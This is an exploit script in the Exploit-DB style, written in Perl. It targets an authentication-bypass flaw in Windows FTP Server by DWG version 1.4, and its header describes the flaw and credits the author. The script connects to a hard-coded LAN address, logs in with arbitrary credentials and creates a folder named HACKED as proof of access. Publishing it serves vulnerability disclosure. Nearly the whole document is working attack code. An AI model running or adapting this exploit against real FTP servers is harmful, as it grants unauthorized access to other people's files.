# Exploit Title: WINDOWS FTP SERVER by DWG (Auth Bypass) 
# Date: April 09, 2010
# Software Link: [http://www.windowsftpserver.com/free_download.html]
# Version: v 1.4
# Tested on: Windows XP SP3
# Author: chap0 
# Email: chap0x90[at]gmail[dot]com
# Site: [www.setfreesecurity.com]
# 
# Windows FTP Server by DWG Software is vulnerable to
# authentication-bypass that will allow attackers to 
# connect with any username and password.
# This give attackers full access to the Top Level 
# directory of the ftp server.
#
# Greetz and many thanks to all Exploit-DBers and GOD gets the Glory
# 
# 
#!/usr/bin/perl

use IO::Socket;

$luser = "evil";
$pass = "hacker";

$mysock = IO::Socket::INET->new(PeerAddr =>'192.168.2.6', PeerPort => '21', Proto => 'tcp');

print "Connecting with a bad credentials. . .\n";
sleep(1);

print $mysock "USER $luser\r\n";
print $mysock "PASS $pass\r\n";

print "Making HACKED folder . . .\n";
sleep(2);

print $mysock "MKD HACKED\r\n";

print "DONE . . .\n";
sleep(1);
